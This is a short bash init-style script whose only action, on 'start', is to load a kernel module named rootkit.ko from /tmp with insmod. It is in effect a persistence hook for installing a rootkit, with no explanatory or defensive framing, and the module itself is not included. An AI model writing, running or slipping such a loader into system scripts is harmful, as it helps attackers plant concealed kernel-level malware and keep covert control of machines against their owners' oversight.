#!/bin/bash

case $1 in
    start)
        /sbin/insmod /tmp/rootkit.ko
    ;;
esac
exit 0
